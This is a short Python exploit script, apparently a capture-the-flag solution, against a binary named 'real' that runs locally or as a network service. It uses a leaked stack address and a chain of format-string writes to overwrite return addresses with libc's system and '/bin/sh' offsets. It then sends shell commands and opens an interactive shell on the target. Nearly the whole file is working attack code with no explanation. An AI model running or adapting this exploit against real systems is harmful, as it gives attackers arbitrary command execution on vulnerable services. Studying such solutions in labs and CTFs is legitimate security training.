import pwnbox,struct,os,time
SERVER=False
def pack(data , f="<Q"):
  return struct.pack(f,data)
 
def unpack(data,f="<Q"):
  return struct.unpack(f,data)[0]

def go(a1,a2):
  p.read_until("-->")
  p.write(a1+"\n")
  p.read_until("-->")
  p.write(a2+"\n")
  
if SERVER:
  ret_libc_start_main = 0x20830
  off_binsh = 0x18c177
  off_system = 0x45390
  p = pwnbox.pipe.SocketPipe("200.200.200.106", 44444)
else:
  ret_libc_start_main = 0x203f1
  off_binsh = 0x189fc0
  off_system =0x456d0
  p = pwnbox.pipe.ProcessPipe("./real")

stack = int(p.read_until("\n").split("is 0x")[1],16)
p.read_until("-->")
p.write(str(stack+0x18+0x4)+"\n")
p.read_until("The value is ")
leak1 = int(p.read_byte(2),16)
go("A","1")


go("%1c"*7+"%%%dc"%(off_binsh-ret_libc_start_main-7)+"%*c%1$lln",str(stack))
go("%%%dc"%(0x7f00+leak1)+"%1$hn",str(stack+4))

go("%1c"*7+"%%%dc"%(off_system-ret_libc_start_main-7)+"%*c%1$lln",str(stack+8))
go("%%%dc"%(0x7f00+leak1)+"%1$hn",str(stack+4+8))

go("%163c%1$hhn",str(stack-8))
for i in range(8):
  go("%9$llx "*10,"1")
go("%9$llx "*10,"1")
cmd = "ls -als 1>&2\n"
for i in range(5):
  p.write(cmd)

time.sleep(5)
p.interact()
